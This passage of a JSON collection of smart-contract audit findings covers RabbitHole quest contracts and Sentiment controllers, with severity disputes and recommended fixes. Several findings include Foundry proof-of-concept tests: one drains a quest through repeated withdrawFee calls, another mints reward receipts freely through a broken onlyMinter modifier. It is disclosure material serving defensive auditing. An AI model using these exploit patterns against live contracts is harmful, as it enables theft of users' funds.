Proof of Concept\n\nIn the following test, Alice mints her receipt after the quest owner has called `withdrawRemainingTokens`. Her call to `quest.claim()` will be reverted due to insufficient funds in the contract.\n\n```solidity\ncontract AuditTest is Test {\n    address deployer;\n    uint256 signerPrivateKey;\n    address signer;\n    address royaltyRecipient;\n    address minter;\n    address protocolFeeRecipient;\n\n    QuestFactory factory;\n    ReceiptRenderer receiptRenderer;\n    RabbitHoleReceipt receipt;\n    TicketRenderer ticketRenderer;\n    RabbitHoleTickets tickets;\n    ERC20 token;\n\n    function setUp() public {\n        deployer = makeAddr(\"deployer\");\n        signerPrivateKey = 0x123;\n        signer = vm.addr(signerPrivateKey);\n        vm.label(signer, \"signer\");\n        royaltyRecipient = makeAddr(\"royaltyRecipient\");\n        minter = makeAddr(\"minter\");\n        protocolFeeRecipient = makeAddr(\"protocolFeeRecipient\");\n\n        vm.startPrank(deployer);\n\n        // Receipt\n        receiptRenderer = new ReceiptRenderer();\n        RabbitHoleReceipt receiptImpl = new RabbitHoleReceipt();\n        receipt = RabbitHoleReceipt(\n            address(new ERC1967Proxy(address(receiptImpl), \"\"))\n        );\n        receipt.initialize(\n            address(receiptRenderer),\n            royaltyRecipient,\n            minter,\n            0\n        );\n\n        // factory\n        QuestFactory factoryImpl = new QuestFactory();\n        factory = QuestFactory(\n            address(new ERC1967Proxy(address(factoryImpl), \"\"))\n        );\n        factory.initialize(signer, address(receipt), protocolFeeRecipient);\n        receipt.setMinterAddress(address(factory));\n\n        // tickets\n        ticketRenderer = new TicketRenderer();\n        RabbitHoleTickets ticketsImpl = new RabbitHoleTickets();\n        tickets = RabbitHoleTickets(\n            address(new ERC1967Proxy(address(ticketsImpl), \"\"))\n        );\n        tickets.initialize(\n            address(ticketRenderer),\n            royaltyRecipient,\n            minter,\n            0\n        );\n\n        // ERC20 token\n        token = new ERC20(\"Mock ERC20\", \"MERC20\");\n        factory.setRewardAllowlistAddress(address(token), true);\n\n        vm.stopPrank();\n    }\n\n    function signReceipt(address account, string memory questId)\n        internal\n        view\n        returns (bytes32 hash, bytes memory signature)\n    {\n        hash = keccak256(abi.encodePacked(account, questId));\n        bytes32 message = ECDSA.toEthSignedMessageHash(hash);\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPrivateKey, message);\n        signature = abi.encodePacked(r, s, v);\n    }\n\n    function test_Erc20Quest_UserCantClaimIfLateRedeem() public {\n        address alice = makeAddr(\"alice\");\n\n        uint256 startTime = block.timestamp + 1 hours;\n        uint256 endTime = startTime + 1 hours;\n        uint256 totalParticipants = 1;\n        uint256 rewardAmountOrTokenId = 1 ether;\n        string memory questId = \"a quest\";\n\n        // create, fund and start quest\n        vm.startPrank(deployer);\n\n        factory.setQuestFee(0);\n\n        Erc20Quest quest = Erc20Quest(\n            factory.createQuest(\n                address(token),\n                endTime,\n                startTime,\n                totalParticipants,\n                rewardAmountOrTokenId,\n                \"erc20\",\n                questId\n            )\n        );\n\n        uint256 rewards = totalParticipants * rewardAmountOrTokenId;\n        deal(address(token), address(quest), rewards);\n        quest.start();\n\n        vm.stopPrank();\n\n        // Alice has the signature to mint her receipt\n        (bytes32 hash, bytes memory signature) = signReceipt(alice, questId);\n\n        // simulate time elapses until the end of the quest\n        vm.warp(endTime);\n\n        vm.prank(deployer);\n        quest.withdrawRemainingTokens(deployer);\n\n        // Now Alice claims her receipt and tries to claim her reward\n        vm.startPrank(alice);\n\n        factory.mintReceipt(questId, hash, signature);\n\n        // The following will fail since there are no more rewards in the contract\n        vm.expectRevert();\n        quest.claim();\n\n        vm.stopPrank();\n    }\n}\n```\n\n### Recommendation\n\nSince tasks are verified off-chain by the indexer, given the current architecture it is not possible to determine on-chain how many tasks have been completed. In this case the recommendation is to prevent the minting of the receipt after the quest end time. This can be done in the `mintReceipt` by checking the `endTime` property which would need to be added to the `Quest` struct or by including it as a deadline in the signed hash.\n\n**[kirk-baird (judge) decreased severity to Medium](https://github.com/code-423n4/2023-01-rabbithole-findings/issues/601#issuecomment-1429337909)**\n\n**[waynehoover (RabbitHole) disagreed with severity and commented](https://github.com/code-423n4/2023-01-rabbithole-findings/issues/601#issuecomment-1440977841):**\n > This is only an issue if the owner withdraws the remaining tokens before everyone has withdrawn their tokens. The owner will not do this.\n\n**[kirk-baird (judge) commented](https://github.com/code-423n4/2023-01-rabbithole-findings/issues/601#issuecomment-1442577837):**\n > I agree that the owner should not do this.\n> \n> However, determining if everyone has minted their tokens yet is not straight forward, as users may not want to pay gas fees or mint / claim receipts immediately. I believe medium severity is a fair rating as there is the potential to accidentally lock funds in the contract.\n\n\n\n***\n\n",
      "summary": "\nA bug report has been filed for the Quest Factory and Erc20Quest contracts. After a user completes a task in the context of a quest, they receive a signed hash that needs to be redeemed on-chain for a receipt that can later be claimed for a reward. The mintReceipt function in the QuestFactory contract does not check if the quest has ended. This means that a user can mint the receipt for completing the task after the quest has ended. If the user does this after the owner of the quest has called withdrawRemainingTokens, then the user won't be able to claim the reward associated with that receipt. The withdrawRemainingTokens function only accounts for previously minted receipts and not pending ones. This results in the user not being able to claim the rewards, as the contract won't have the required funds.\n\nThe recommendation is to prevent the minting of the receipt after the quest end time. This can be done in the mintReceipt by checking the endTime property which would need to be added to the Quest struct or by including it as a deadline in the signed hash.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/601",
      "tags": [],
      "finders": [
        "HollaDieWaldfee",
        "glcanvas",
        "badman",
        "m9800",
        "peanuts",
        "Breeje",
        "carrotsmuggler",
        "lukris02",
        "sashik_eth",
        "joestakey",
        "CodingNameKiki",
        "Kenshin",
        "adriro",
        "csanuragjain",
        "cccz",
        "0xbepresent",
        "peakbolt",
        "Ruhum",
        "Tricko",
        "0xRobocop",
        "M4TZ1P",
        "prestoncodes",
        "mert_eren",
        "bin2chen",
        "rvierdiiev"
      ]
    },
    {
      "id": "8852",
      "title": "[M-01] QuestFactory is suspicious of the reorg attack",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/QuestFactory.sol#L75\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/QuestFactory.sol#L108\n\n\n## Vulnerability details\n\n## Description\n\nThe `createQuest` function deploys a quest contract using the `create`, where the address derivation depends only on the `QuestFactory` nonce. \n\nAt the same time, some of the chains (Polygon, Optimism, Arbitrum) to which the `QuestFactory` will be deployed are suspicious of the reorg attack.\n\n- https://polygonscan.com/blocks_forked\n\n![](https://i.imgur.com/N8tDUVX.png)\n\nHere you may be convinced that the Polygon has in practice subject to reorgs. Even more, the reorg on the picture is 1.5 minutes long. So, it is quite enough to create the quest and transfer funds to that address, especially when someone uses a script, and not doing it by hand.\n\nOptimistic rollups (Optimism/Arbitrum) are also suspect to reorgs since if someone finds a fraud the blocks will be reverted, even though the user receives a confirmation and already created a quest.\n\n## Attack scenario\n\nImagine that Alice deploys a quest, and then sends funds to it. Bob sees that the network block reorg happens and calls `createQuest`. Thus, it creates `quest` with an address to which Alice sends funds. Then Alices' transactions are executed and Alice transfers funds to Bob's controlled quest. \n\n## Impact\n\nIf users rely on the address derivation in advance or try to deploy the wallet with the same address on different EVM chains, any funds sent to the wallet could potentially be withdrawn by anyone else. All in all, it could lead to the theft of user funds.\n\n## Recommended Mitigation Steps\n\nDeploy the quest contract via `create2` with `salt` that includes `msg.sender` and `rewardTokenAddress_`.",
      "summary": "\nA bug has been discovered in the QuestFactory.sol contract, which is part of the Quest Protocol. The `createQuest` function deploys a quest contract using the `create` command, where the address derivation depends only on the `QuestFactory` nonce. This is a problem for some of the chains (Polygon, Optimism, Arbitrum) to which the `QuestFactory` will be deployed, as they are vulnerable to reorg attacks. \n\nIn a reorg attack, Bob can call `createQuest` and create a quest with an address to which Alice sends funds. As a result, Alice's funds can be withdrawn by Bob. This could lead to the theft of user funds, which is a serious issue.\n\nTo mitigate this issue, it is recommended to deploy the quest contract via `create2` with `salt` that includes `msg.sender` and `rewardTokenAddress_`. This will help to ensure that the address derivation is secure, and users will not be at risk of having their funds stolen.",
      "quality_score": 5,
      "rarity_score": 2.8,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/661",
      "tags": [
        "Chain Reorganization Attack"
      ],
      "finders": [
        "V_B"
      ]
    },
    {
      "id": "8851",
      "title": "[H-02] Protocol fees can be withdrawn multiple times in Erc20Quest",
      "impact": "HIGH",
      "content": "## Lines of code\n\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Erc20Quest.sol#L102-L104\n\n\n## Vulnerability details\n\nThe `withdrawFee` function present in the `Erc20Quest` contract can be used to withdraw protocol fees after a quest has ended, which are sent to the protocol fee recipient address:\n\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Erc20Quest.sol#L102-L104\n\n```solidity\nfunction withdrawFee() public onlyAdminWithdrawAfterEnd {\n    IERC20(rewardToken).safeTransfer(protocolFeeRecipient, protocolFee());\n}\n```\n\nThis function doesn't provide any kind of protection and can be called multiple times, which will send more tokens than intended to the protocol fee recipient, stealing funds from the contract.\n\n## Impact\n\nThe `withdrawFee` function can be called multiples after a quest has ended, potentially stealing funds from other people. The contract may have funds from unclaimed receipts (i.e. users that have completed the quest, redeemed their receipt but haven't claimed their rewards yet) and remaining tokens from participants who didn't complete the quest, which can be claimed back by the owner of the quest.\n\nNote also that the `onlyAdminWithdrawAfterEnd` modifier, even though it indicates that an \"admin\" should be allowed to call this function, only validates the quest end time and fails to provide any kind of access control:\n\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Quest.sol#L76-L79\n\n```solidity\nmodifier onlyAdminWithdrawAfterEnd() {\n    if (block.timestamp < endTime) revert NoWithdrawDuringClaim();\n    _;\n}\n```\n\nThis means that anyone could call this function, so even if the quest owner or the protocol fee recipient behave correctly, a griefer could potentially call this function right after the quest end time to remove all (or most) of the funds from the contract.\n\n## PoC\n\nIn the following demonstration, the `withdrawFee` function is called multiple times by a bad actor to remove all tokens from the quest contract.\n\n```solidity\ncontract AuditTest is Test {\n    address deployer;\n    uint256 signerPrivateKey;\n    address signer;\n    address royaltyRecipient;\n    address minter;\n    address protocolFeeRecipient;\n\n    QuestFactory factory;\n    ReceiptRenderer receiptRenderer;\n    RabbitHoleReceipt receipt;\n    TicketRenderer ticketRenderer;\n    RabbitHoleTickets tickets;\n    ERC20 token;\n\n    function setUp() public {\n        deployer = makeAddr(\"deployer\");\n        signerPrivateKey = 0x123;\n        signer = vm.addr(signerPrivateKey);\n        vm.label(signer, \"signer\");\n        royaltyRecipient = makeAddr(\"royaltyRecipient\");\n        minter = makeAddr(\"minter\");\n        protocolFeeRecipient = makeAddr(\"protocolFeeRecipient\");\n\n        vm.startPrank(deployer);\n\n        // Receipt\n        receiptRenderer = new ReceiptRenderer();\n        RabbitHoleReceipt receiptImpl = new RabbitHoleReceipt();\n        receipt = RabbitHoleReceipt(\n            address(new ERC1967Proxy(address(receiptImpl), \"\"))\n        );\n        receipt.initialize(\n            address(receiptRenderer),\n            royaltyRecipient,\n            minter,\n            0\n        );\n\n        // factory\n        QuestFactory factoryImpl = new QuestFactory();\n        factory = QuestFactory(\n            address(new ERC1967Proxy(address(factoryImpl), \"\"))\n        );\n        factory.initialize(signer, address(receipt), protocolFeeRecipient);\n        receipt.setMinterAddress(address(factory));\n\n        // tickets\n        ticketRenderer = new TicketRenderer();\n        RabbitHoleTickets ticketsImpl = new RabbitHoleTickets();\n        tickets = RabbitHoleTickets(\n            address(new ERC1967Proxy(address(ticketsImpl), \"\"))\n        );\n        tickets.initialize(\n            address(ticketRenderer),\n            royaltyRecipient,\n            minter,\n            0\n        );\n\n        // ERC20 token\n        token = new ERC20(\"Mock ERC20\", \"MERC20\");\n        factory.setRewardAllowlistAddress(address(token), true);\n\n        vm.stopPrank();\n    }\n\n    function signReceipt(address account, string memory questId)\n        internal\n        view\n        returns (bytes32 hash, bytes memory signature)\n    {\n        hash = keccak256(abi.encodePacked(account, questId));\n        bytes32 message = ECDSA.toEthSignedMessageHash(hash);\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPrivateKey, message);\n        signature = abi.encodePacked(r, s, v);\n    }\n\n    function claimReceipt(address account, string memory questId) internal {\n        (bytes32 hash, bytes memory signature) = signReceipt(account, questId);\n        vm.prank(account);\n        factory.mintReceipt(questId, hash, signature);\n    }\n    \n    function test_Erc20Quest_ProtocolFeeWithdrawMultipleTimes() public {\n        address alice = makeAddr(\"alice\");\n        address attacker = makeAddr(\"attacker\");\n\n        uint256 startTime = block.timestamp + 1 hours;\n        uint256 endTime = startTime + 1 hours;\n        uint256 totalParticipants = 1;\n        uint256 rewardAmountOrTokenId = 1 ether;\n        string memory questId = \"a quest\";\n\n        // create, fund and start quest\n        vm.startPrank(deployer);\n\n        Erc20Quest quest = Erc20Quest(\n            factory.createQuest(\n                address(token),\n                endTime,\n                startTime,\n                totalParticipants,\n                rewardAmountOrTokenId,\n                \"erc20\",\n                questId\n            )\n        );\n\n        uint256 rewards = totalParticipants * rewardAmountOrTokenId;\n        uint256 fees = (rewards * factory.questFee()) / 10_000;\n        deal(address(token), address(quest), rewards + fees);\n        quest.start();\n\n        vm.stopPrank();\n\n        // simulate at least one user claims a receipt\n        claimReceipt(alice, questId);\n\n        // simulate time elapses until the end of the quest\n        vm.warp(endTime);\n\n        // The following can be executed by attacker (griefer) or by the fee recipient\n        vm.startPrank(attacker);\n\n        uint256 protocolFee = quest.protocolFee();\n        uint256 withdrawCalls = (rewards + fees) / protocolFee;\n\n        for (uint256 i = 0; i < withdrawCalls; i++) {\n            quest.withdrawFee();\n        }\n\n        // Fee recipient has 100% of the funds\n        assertEq(token.balanceOf(protocolFeeRecipient), rewards + fees);\n        assertEq(token.balanceOf(address(quest)), 0);\n\n        vm.stopPrank();\n    }\n}\n```\n\n## Recommendation\n\nAdd a flag to the contract to indicate if protocol fees have been already withdrawn. Add a check to prevent the function from being called again.",
      "summary": "\nThe bug report is about a vulnerability in the `withdrawFee` function present in the `Erc20Quest` contract which can be used to withdraw protocol fees after a quest has ended. This function does not provide any kind of protection and can be called multiple times, resulting in the theft of funds from the contract. This can be done by anyone since the `onlyAdminWithdrawAfterEnd` modifier only validates the quest end time and fails to provide any kind of access control. \n\nThe impact of this bug is that the `withdrawFee` function can be called multiples after a quest has ended, potentially stealing funds from other people. The contract may have funds from unclaimed receipts and remaining tokens from participants who didn't complete the quest, which can be claimed back by the owner of the quest.\n\nA Proof of Concept is provided which demonstrates how the `withdrawFee` function can be called multiple times by a bad actor to remove all tokens from the quest contract. \n\nThe recommendation to fix this bug is to add a flag to the contract to indicate if protocol fees have been already withdrawn. Additionally, a check should be added to prevent the function from being called again.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/605",
      "tags": [
        "Access Control"
      ],
      "finders": [
        "doublesharp",
        "HollaDieWaldfee",
        "glcanvas",
        "yixxas",
        "0xngndev",
        "holme",
        "ladboy233",
        "cryptonue",
        "usmannk",
        "peanuts",
        "SovaSlava",
        "bytes032",
        "KmanOfficial",
        "Iurii3",
        "carrotsmuggler",
        "lukris02",
        "rbserver",
        "sashik_eth",
        "CodingNameKiki",
        "tnevler",
        "mahdikarimi",
        "adriro",
        "AkshaySrivastav",
        "codeislight",
        "IllIllI",
        "fs0c",
        "Bauer",
        "hihen",
        "cccz",
        "peakbolt",
        "Ruhum",
        "wait",
        "0xRobocop",
        "Atarpara",
        "trustindistrust",
        "hansfriese",
        "chaduke",
        "hl_",
        "horsefacts",
        "M4TZ1P",
        "zaskoh",
        "mert_eren",
        "mrpathfindr",
        "prestoncodes",
        "KIntern_NA",
        "ArmedGoose",
        "MiniGlome",
        "manikantanynala97",
        "martin",
        "Garrett",
        "omis",
        "bin2chen",
        "zadaru13",
        "ElKu",
        "gzeon",
        "Lotus",
        "evan",
        "0xmrhoodie",
        "rvierdiiev",
        "timongty"
      ]
    },
    {
      "id": "8850",
      "title": "[H-01] Bad implementation in minter access control for RabbitHoleReceipt and RabbitHoleTickets contracts",
      "impact": "HIGH",
      "content": "## Lines of code\n\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleReceipt.sol#L58-L61\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleTickets.sol#L47-L50\n\n\n## Vulnerability details\n\nBoth `RabbitHoleReceipt` and `RabbitHoleTickets` contracts define a `mint` function that is protected by a `onlyMinter` modifier:\n\nRabbitHoleReceipt:\n\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleReceipt.sol#L98-L104\n\n```solidity\nfunction mint(address to_, string memory questId_) public onlyMinter {\n    _tokenIds.increment();\n    uint newTokenID = _tokenIds.current();\n    questIdForTokenId[newTokenID] = questId_;\n    timestampForTokenId[newTokenID] = block.timestamp;\n    _safeMint(to_, newTokenID);\n}\n```\n\nRabbitHoleTickets:\n\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleTickets.sol#L83-L85\n\n```solidity\nfunction mint(address to_, uint256 id_, uint256 amount_, bytes memory data_) public onlyMinter {\n    _mint(to_, id_, amount_, data_);\n}\n```\n\nHowever, in both cases the modifier implementation is flawed as there isn't any check for a require or revert, the comparison will silently return false and let the execution continue:\n\n```solidity\nmodifier onlyMinter() {\n    msg.sender == minterAddress;\n    _;\n}\n```\n\n## Impact\n\nAny account can mint any number of `RabbitHoleReceipt` and `RabbitHoleTickets` tokens.\n\nThis represents a critical issue as receipts can be used to claim rewards in quests. An attacker can freely mint receipt tokens for any quest to steal all the rewards from it.\n\n## PoC\n\nThe following test demonstrates the issue.\n\n```solidity\ncontract AuditTest is Test {\n    address deployer;\n    uint256 signerPrivateKey;\n    address signer;\n    address royaltyRecipient;\n    address minter;\n    address protocolFeeRecipient;\n\n    QuestFactory factory;\n    ReceiptRenderer receiptRenderer;\n    RabbitHoleReceipt receipt;\n    TicketRenderer ticketRenderer;\n    RabbitHoleTickets tickets;\n    ERC20 token;\n\n    function setUp() public {\n        deployer = makeAddr(\"deployer\");\n        signerPrivateKey = 0x123;\n        signer = vm.addr(signerPrivateKey);\n        vm.label(signer, \"signer\");\n        royaltyRecipient = makeAddr(\"royaltyRecipient\");\n        minter = makeAddr(\"minter\");\n        protocolFeeRecipient = makeAddr(\"protocolFeeRecipient\");\n\n        vm.startPrank(deployer);\n\n        // Receipt\n        receiptRenderer = new ReceiptRenderer();\n        RabbitHoleReceipt receiptImpl = new RabbitHoleReceipt();\n        receipt = RabbitHoleReceipt(\n            address(new ERC1967Proxy(address(receiptImpl), \"\"))\n        );\n        receipt.initialize(\n            address(receiptRenderer),\n            royaltyRecipient,\n            minter,\n            0\n        );\n\n        // factory\n        QuestFactory factoryImpl = new QuestFactory();\n        factory = QuestFactory(\n            address(new ERC1967Proxy(address(factoryImpl), \"\"))\n        );\n        factory.initialize(signer, address(receipt), protocolFeeRecipient);\n        receipt.setMinterAddress(address(factory));\n\n        // tickets\n        ticketRenderer = new TicketRenderer();\n        RabbitHoleTickets ticketsImpl = new RabbitHoleTickets();\n        tickets = RabbitHoleTickets(\n            address(new ERC1967Proxy(address(ticketsImpl), \"\"))\n        );\n        tickets.initialize(\n            address(ticketRenderer),\n            royaltyRecipient,\n            minter,\n            0\n        );\n\n        // ERC20 token\n        token = new ERC20(\"Mock ERC20\", \"MERC20\");\n        factory.setRewardAllowlistAddress(address(token), true);\n\n        vm.stopPrank();\n    }\n    \n    function test_RabbitHoleReceipt_RabbitHoleTickets_AnyoneCanMint() public {\n        address attacker = makeAddr(\"attacker\");\n\n        vm.startPrank(attacker);\n\n        // Anyone can freely mint RabbitHoleReceipt\n        string memory questId = \"a quest\";\n        receipt.mint(attacker, questId);\n        assertEq(receipt.balanceOf(attacker), 1);\n\n        // Anyone can freely mint RabbitHoleTickets\n        uint256 tokenId = 0;\n        tickets.mint(attacker, tokenId, 1, \"\");\n        assertEq(tickets.balanceOf(attacker, tokenId), 1);\n\n        vm.stopPrank();\n    }\n}\n```\n\n## Recommendation\n\nThe modifier should require that the caller is the `minterAddress` in order to revert the call in case this condition doesn't hold.\n\n```solidity\nmodifier onlyMinter() {\n    require(msg.sender == minterAddress);\n    _;\n}\n```",
      "summary": "\nThis bug report is about two contracts, `RabbitHoleReceipt` and `RabbitHoleTickets`, that contain a `mint` function protected by a `onlyMinter` modifier. The modifier is flawed as it does not contain a require or revert statement, meaning that any account can mint any number of tokens. This is a critical issue as it allows attackers to mint receipt tokens for any quest and claim the rewards.\n\nThe bug can be demonstrated with the provided proof-of-concept code. The recommendation is to modify the `onlyMinter` modifier so that it requires that the caller is the `minterAddress` and reverts the call if this condition is not met.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/608",
      "tags": [],
      "finders": [
        "vanko1",
        "0xMirce",
        "millersplanet",
        "tsvetanovv",
        "frankudoags",
        "usmannk",
        "Timenov",
        "SovaSlava",
        "vagrant",
        "mookimgo",
        "Cryptor",
        "rbserver",
        "c3phas",
        "DimitarDimitrov",
        "adriro",
        "Kenshin",
        "AkshaySrivastav",
        "btk",
        "Josiah",
        "codeislight",
        "Awesome",
        "Deivitto",
        "shark",
        "RaymondFam",
        "Aymen0909",
        "UdarTeam",
        "trustindistrust",
        "hansfriese",
        "pfapostol",
        "Jayus",
        "sakshamguruji",
        "pavankv",
        "prestoncodes",
        "oberon",
        "luxartvinsec",
        "petersspetrov",
        "fellows",
        "Garrett",
        "paspe",
        "7siech",
        "ElKu",
        "KrisApostolov",
        "gzeon",
        "0xMAKEOUTHILL",
        "thekmj",
        "navinavu",
        "xAriextz",
        "AlexCzm",
        "yosuke",
        "amaechieth"
      ]
    },
    {
      "id": "6277",
      "title": "M-7: All Rage Trade functions allow sending tokens to a different address, leading to incorrect tokensIn",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-01-sentiment-judging/issues/5 \n\n## Found by \nobront\n\n## Summary\n\nAll three approved functions on Rage Trade (`depositTokens()`, `withdrawTokens()` and `redeemTokens()`) allow for a `receiver` argument to be included, which sends the resulting tokens to that address. The corresponding Controller assumes that all tokens are withdrawn to the Sentiment account that called the function.\n\n## Vulnerability Detail\n\nThe three functions that can be called on Rage Trade have the following signatures:\n- depositToken(address token, address receiver, uint256 amount)\n- redeemToken(address token, address receiver, uint256 amount)\n- withdrawToken(address token, address receiver, uint256 amount)\n\nEach of these functions contains a `receiver` argument, which can be passed any address that will receive the outputted tokens. \n\nThe DNGMXVaultController incorrectly assumes in all cases that the outputted tokens will be received by the Sentiment account in question, regardless of what is entered as a receiver.\n\n## Impact\n\nAccounting on user accounts can be thrown off (intentionally or unintentionally), resulting in mismatches between their assets array and hasAsset mapping and the reality of their account.\n\nThis specific Impact was judged as Medium for multiple issues in the previous contest:\n- https://github.com/sherlock-audit/2022-11-sentiment-judging/issues/20\n- https://github.com/sherlock-audit/2022-11-sentiment-judging/issues/7\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-01-sentiment/blob/main/controller-52/src/rage/DNGMXVaultController.sol#L60-L73\n\nhttps://github.com/sherlock-audit/2023-01-sentiment/blob/main/controller-52/src/rage/DNGMXVaultController.sol#L75-L88\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nWhen decoding the data from the call to Rage Trade, confirm that receiver == msg.sender. Here's an example with the deposit function:\n\n```diff\nfunction canDeposit(bytes calldata data)\n    internal\n    view\n    returns (bool, address[] memory, address[] memory)\n{\n    (address token, address receiver,) = abi.decode(\n        data, (address, address, uint256)\n    );\n+   if (receiver != msg.sender) return (true, vault, new address[](0));\n\n    address[] memory tokensOut = new address[](1);\n    tokensOut[0] = token;\n\n    return (true, vault, tokensOut);\n}\n```\n\n\n## Discussion\n\n**r0ohafza**\n\nAgree with the issue mentioned. Disagree with the fix provided since the receiver can be any other account and still lead to an accounting error, I think the recommended fix mentioned by @zobront  on issue #10 will resolve this as well.\n\n**bahurum**\n\nEscalate for 50 USDC.\nI believe that this issue is Low severity.\nI filed it as a low severity myself (https://github.com/sherlock-audit/2023-01-sentiment-judging/issues/26). See the 3rd point in the Vulnerability Detail section.\nThis issue will never lead to loss or lockup of funds. So by Sherlock judging criteria this is Low severity. \nOtherwise, please provide a scenario where this issue leads to a loss or lockup of funds.\nThe watson mentions some similiar issues previously judged as Medium. I didn't see those before or I would have escalated them as well for the same reason.\n\n**sherlock-admin**\n\n > Escalate for 50 USDC.\n> I believe that this issue is Low severity.\n> I filed it as a low severity myself (https://github.com/sherlock-audit/2023-01-sentiment-judging/issues/26). See the 3rd point in the Vulnerability Detail section.\n> This issue will never lead to loss or lockup of funds. So by Sherlock judging criteria this is Low severity. \n> Otherwise, please provide a scenario where this issue leads to a loss or lockup of funds.\n> The watson mentions some similiar issues previously judged as Medium. I didn't see those before or I would have escalated them as well for the same reason.\n\nYou've created a valid escalation for 50 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**hrishibhat**\n\nEscalation accepted\n\nWhile the above issue is not considered a low in this case, \nconsidering issue #26 as a valid medium based on further discussions in issue #10 \n\n\n\n**sherlock-admin**\n\n> Escalation accepted\n> \n> While the above issue is not considered a low in this case, \n> considering issue #26 as a valid medium based on further discussions in issue #10 \n> \n> \n\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nA bug was reported on the Rage Trade functions of the Sentiment project. The bug was found by obront through manual review and concerns the three functions `depositTokens()`, `withdrawTokens()` and `redeemTokens()`. These functions each have a `receiver` argument that can be passed any address that will receive the outputted tokens. The DNGMXVaultController, however, incorrectly assumes in all cases that the outputted tokens will be received by the Sentiment account in question, regardless of what is entered as a receiver.\n\nThis bug has been judged as having a medium impact, as it can lead to accounting errors on user accounts. This was previously seen in issues #20 and #7 in the 2022-11-sentiment-judging contest. A code snippet was provided to show the issue, and a recommendation was given to confirm that receiver == msg.sender when decoding the data from the call to Rage Trade.\n\nThe issue was discussed, with r0ohafza agreeing with the issue mentioned and bahurum escalating for 50 USDC. Hrishibhat then accepted the escalation, considering issue #26 as a valid medium based on further discussions in issue #10. Sherlock-admin accepted the escalation, and the contestants' payouts and scores will be updated according to the changes made on this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Sentiment Update #3",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-01-sentiment-judging/issues/5",
      "tags": [],
      "finders": [
        "obront"
      ]
    },
    {
      "id": "6276",
      "title": "M-6: Using one controller for two addresses could risk signature collisions",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-01-sentiment-judging/issues/9 \n\n## Found by \nobront\n\n## Summary\n\nThe DNGMXVaultController is intended to be used as a controller for two separate contracts when interacting with Rage Trade. While individual contracts check for signature collisions, there is no protection in this Controller. If the contracts end up with functions with colliding signatures, this may enable users to call illegal functions and get around the protocol safeguards.\n\n## Vulnerability Detail\n\nWhile most of Sentiment's Controllers correspond to one contract, the DNGMXVaultController is one controller that will support two separate contracts: `DepositPeriphery` and `WithdrawPeriphery`.\n\nWhile signature collisions are unlikely, they do happen. For this reason, the Solidity compiler stops code from compiling in the case of a collision. This ensures that there will not be issues in any EVM bytecode. Because Sentiment controllers  approve function calls based on signatures, they can be sure that, for any given contract, they will only be approving the function they are intending.\n\nHowever, once multiple contracts are managed by one controller, there are no compiler checks across these contracts for colliding signatures. The result is that there is the potential for a function signature on one contract that is approved, due to a matching signature on the other contract.\n\n## Impact\n\nThere is the potential for users to get access to non-permitted functions if there is a signature collision.\n\nThis is a security risk in this specific case, but is also a more global suggestion for Sentiment. While two contracts on one Controller one time is unlikely to cause a problem, the practice of loading multiple contracts onto on Controller should be avoided, as the risks will increase as this is performed.\n\n## Code Snippet\n\nThese three functions do not exist on the same contract:\n\nhttps://github.com/sherlock-audit/2023-01-sentiment/blob/main/controller-52/src/rage/DNGMXVaultController.sol#L15-L22\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nSplit DNGMXVaultController into two files, one for each of the two contracts that will be interacted with. \n\nGoing forward, continue to uphold the practice of always having one Controller per contract, unless the two contracts are identical and non-upgradeable.\n\n## Discussion\n\n**bahurum**\n\nEscalate for 50 USDC. \nThis issue should be low/informational.\nI have flagged the issue but as Informational (https://github.com/sherlock-audit/2023-01-sentiment-judging/issues/25), since the two target contracts are non-upgradeable and new functions can never be added and signature collision is 